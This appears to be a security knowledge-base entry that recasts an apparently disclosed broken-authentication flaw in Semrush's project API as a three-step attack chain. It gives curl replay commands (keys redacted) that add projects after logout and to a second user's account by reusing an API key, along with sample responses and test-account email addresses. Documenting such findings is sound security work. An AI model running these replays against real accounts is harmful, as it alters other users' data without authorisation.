---
tags:
  - broken-auth
  - api-key-reuse
  - replay-attack
  - semrush
type: attack_chain
tools:
  - '[[tools/Python]]'
tactics:
  - '[[Initial Access]]'
verified: false
platforms:
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Setup-Test-Users-and-Capture-Initial-Request]]'
  - '[[procedures/Replay-Request-Post-Logout-for-Same-User]]'
  - '[[procedures/Cross-User-Project-Injection-via-API-Key-Reuse]]'
step_count: 3
techniques:
  - '[[Valid Accounts]]'
  - '[[External Remote Services]]'
updated_at: '2025-12-14T17:31:11.276Z'
description: >-
  Multi-stage attack exploiting broken authentication in Semrush's project
  creation API, enabling replay of requests with API keys to add projects to
  user accounts without session validation.
skill_level: intermediate
impact_level: high
id: c7d4b6e4-6142-462f-8292-0e22b17cfe2c
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Valid Accounts]]'
  - '[[External Remote Services]]'
---
# Broken Authentication in Semrush API Allowing Unauthorized Project Addition via Replay Attacks

Multi-stage attack chain demonstrating exploitation of a broken authentication mechanism in Semrush's project creation API, where API keys alone suffice for authentication without session cookie validation, allowing replay attacks to inject projects into user accounts post-logout or across users.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup and Capture] --> B[Replay Post-Logout]
    B --> C[Cross-User Injection]
    C --> D[Unauthorized Access Achieved]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Python]]

### Target Environment

- Web platform
- Access to Semrush.com API endpoints
- No specific ports required (HTTPS/443 implied)

### Initial Access Requirements

- Valid Semrush account credentials for test users
- API keys for target users
- Tools for capturing and replaying HTTP requests (e.g., browser dev tools or Burp Suite)
- Network access to www.semrush.com

## Detailed Attack Procedures

### Step 1: Setup Test Users and Capture Initial Request
procedure: [[procedures/Setup-Test-Users-and-Capture-Initial-Request]]

**Objective**: Create test accounts and capture a legitimate project creation request during an active session to obtain the API key and request structure for replay.

**Instructions**: Register two test users on semrush.com (e.g., cleganearya1@gmail.com and saidutt.mekala@gmail.com). Log in as saidutt.mekala@gmail.com, create a project via the UI, and capture the POST request using browser developer tools. Use [[commands/capture-semrush-project-creation]] to document the request:

```bash
# Simulate via curl (replace key and cookies with captured values)
curl -X POST "https://www.semrush.com/projects/api/projects/?key=█████████" \
  -H "Content-Type: application/json" \
  -H "Cookie: cfduid=...; PHPSESSID=..." \
  -d '{"domain":"BB1236.com","name":"BB12367.com","url":"BB123678.com","acl":{"write":true}}'
```

Delete the test project afterward to clean up.

**Expected Output**: HTTP 200 response with project details including the user's email.

**Success Indicators**:
- Request captured with valid API key and headers
- Project successfully created and verifiable in the account

### Step 2: Replay Request Post-Logout for Same User
procedure: [[procedures/Replay-Request-Post-Logout-for-Same-User]]

**Objective**: Demonstrate session independence by replaying the captured request after logout, confirming that API key alone authenticates and allows project addition without active session.

**Instructions**: Log out of the Semrush application and close the browser. Replay the captured request with modified parameters using the same API key. Execute [[commands/replay-semrush-request-post-logout]]:

```bash
curl -X POST "https://www.semrush.com/projects/api/projects/?key=█████████" \
  -H "Content-Type: application/json" \
  -H "Cookie: cfduid=...; PHPSESSID=..." \
  -d '{"domain":"Walterwhite12.com","name":"Walterwhite12.com","url":"Walterwhite12.com","acl":{"write":true}}'
```

**Expected Output**: HTTP 200 response confirming project addition, e.g., {"id":1266025,"domain":"walterwhite12.com","name":"Walterwhite12.com","email":"saidutt.mekala@gmail.com",...}

**Success Indicators**:
- Project added to the account despite no active session
- Response includes the target user's email

### Step 3: Cross-User Project Injection via API Key Reuse
procedure: [[procedures/Cross-User-Project-Injection-via-API-Key-Reuse]]

**Objective**: Exploit API key reuse across users by replaying the request with a different user's API key, allowing unauthorized project addition to another account.

**Instructions**: Obtain the API key for the second user (cleganearya1@gmail.com). Replay the request using this key and modified parameters. Use [[commands/cross-user-semrush-project-injection]]:

```bash
curl -X POST "https://www.semrush.com/projects/api/projects/?key=█████████" \
  -H "Content-Type: application/json" \
  -H "Cookie: cfduid=...; PHPSESSID=..." \
  -d '{"domain":"Walterwhite12.com","name":"Walterwhite12.com","url":"Walterwhite12.com","acl":{"write":true}}'
```

**Expected Output**: HTTP 200 response with project details tied to cleganearya1@gmail.com, e.g., {"id":1266027,"domain":"walterwhite12.com","name":"Walterwhite12.com","email":"cleganearya1@gmail.com",...}

**Success Indicators**:
- Project injected into the second user's account
- No session validation required, confirming broken authentication

## Attack Chain Summary

### Key Achievements

1. Captured legitimate API request structure for replay
2. Demonstrated post-logout project addition using API key alone
3. Enabled cross-user unauthorized modifications via API key reuse

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Valid Accounts]] Valid Accounts
- [[External Remote Services]] External Remote Services

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access

---

*Last updated: 2023-10-01T00:00:00Z*
